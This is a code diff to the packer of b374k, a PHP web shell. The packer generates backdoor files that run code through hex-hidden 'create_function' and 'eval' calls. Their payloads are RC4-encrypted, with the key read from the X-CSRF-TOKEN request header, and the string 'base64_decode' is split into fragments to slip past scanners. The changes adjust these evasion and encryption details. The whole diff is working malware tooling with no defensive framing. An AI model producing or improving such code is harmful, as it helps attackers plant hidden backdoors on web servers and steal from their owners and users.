@@ -531,7 +531,7 @@ function packer_output($str){
 	header("Content-Type: text/plain");
 	header("Cache-Control: no-cache");
 	header("Pragma: no-cache");
-    $str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|0|'.$str;
+    $str = @date("d-M-Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|0|'.$str;
     echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 	die();
 }
@@ -606,8 +606,8 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		if(!is_writable($output)) return array("error : file ".$output." exists and is not writable{[|a374k|]}", null, null);
 	}
 
-	if(!empty($password)) $password = "\$GLOBALS['token'] = \"".cryptMyMd5($password, $salt)."\";\n";
-	$cipher_key = "\$GLOBALS['cipher_key'] = \"" . $GLOBALS['cipher_key'] . "\";";
+	if(!empty($password)) $password = "\$GLOBALS['token']=\"".cryptMyMd5($password, $salt)."\";";
+	$cipher_key = "\$GLOBALS['cipher_key']=\"" . $GLOBALS['cipher_key'] . "\";";
 
 	$compress_level = (int) $compress_level;
 	if($compress_level<0) $compress_level = 0;
@@ -617,8 +617,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
     if ($output) {
         $header = "<?php\n";
     }
-	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function bds($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';
-
+	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){if(!$a){return 0;}$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function bds($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';
 
 	if($strip=='yes'){
 		$phpcode = packer_strips($phpcode);
@@ -654,7 +653,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = "bds(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
+				$encoder = "bds(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:0,ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
@@ -662,7 +661,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
 		}
 
-		$func = '_'.generateRandomString(4);
+		$func = '_'.generateRandomString(2);
 		$code = $header.$password."\$cf=hex2bin('".bin2hex("create_function")."');\$".$func."=\$cf('\$x',hex2bin('".bin2hex("eval")."').'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
 	}else{
         $code = $header.$password."?>".$content;
